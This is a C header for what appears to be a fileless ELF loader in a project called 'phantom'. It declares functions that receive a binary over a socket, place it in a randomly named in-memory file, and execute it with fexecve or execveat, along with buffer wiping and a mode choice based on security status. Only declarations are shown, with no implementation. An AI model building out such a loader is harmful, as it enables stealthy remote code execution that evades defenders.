
#ifndef MEMFD_LOADER_H
#define MEMFD_LOADER_H

#include "phantom.h"
#include "syscall_ports.h"
#include <stdint.h>
#include <stddef.h>

#define PH_MEMFD_NAME_LENGTH 16
#define PH_MEMFD_NAME_CHARSET "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
#define PH_MEMFD_MAX_SIZE (10 * 1024 * 1024)
#define PH_MEMFD_CHUNK_SIZE 4096

#ifndef MFD_CLOEXEC
#define MFD_CLOEXEC 0x0001U
#endif

#ifndef MFD_ALLOW_SEALING
#define MFD_ALLOW_SEALING 0x0002U
#endif

typedef enum {
    PH_EXEC_MODE_MEMFD = 0,
    PH_EXEC_MODE_EXECVEAT,
    PH_EXEC_MODE_DISK
} ph_exec_mode_t;

typedef struct {
    int memfd;
    char memfd_name[PH_MEMFD_NAME_LENGTH];
    ph_exec_mode_t exec_mode;
    size_t elf_size;
    int is_loaded;
    int is_executed;
    uint8_t *receive_buffer;
    size_t buffer_size;
    size_t bytes_received;
} ph_memfd_ctx_t;

typedef struct {
    uint8_t magic[4];
    uint8_t class;
    uint8_t data;
    uint8_t version;
    uint8_t osabi;
    uint16_t type;
    uint16_t machine;
    uint32_t entry_point;
    int is_valid;
} ph_elf_header_t;

int ph_memfd_init(ph_memfd_ctx_t *ctx);
int ph_memfd_create_file(ph_memfd_ctx_t *ctx);
void ph_memfd_cleanup(ph_memfd_ctx_t *ctx);

int ph_memfd_receive_elf(ph_memfd_ctx_t *ctx, int socket_fd);
int ph_memfd_receive_elf_chunked(ph_memfd_ctx_t *ctx, int socket_fd, size_t total_size);

int ph_memfd_validate_elf(ph_memfd_ctx_t *ctx, ph_elf_header_t *header);
int ph_memfd_verify_elf_header(const uint8_t *buffer, size_t size, ph_elf_header_t *header);

int ph_memfd_execute(ph_memfd_ctx_t *ctx, char *const argv[], char *const envp[]);
int ph_memfd_execute_with_fexecve(ph_memfd_ctx_t *ctx, char *const argv[], char *const envp[]);
int ph_memfd_execute_with_execveat(ph_memfd_ctx_t *ctx, char *const argv[], char *const envp[]);
int ph_memfd_execute_disk_fallback(ph_memfd_ctx_t *ctx, const char *disk_path, char *const argv[], char *const envp[]);

int ph_memfd_wipe_buffer(ph_memfd_ctx_t *ctx);
int ph_memfd_seal_file(ph_memfd_ctx_t *ctx);

const char* ph_memfd_exec_mode_name(ph_exec_mode_t mode);
int ph_memfd_select_mode(ph_memfd_ctx_t *ctx, ph_security_status_t *security);

#endif
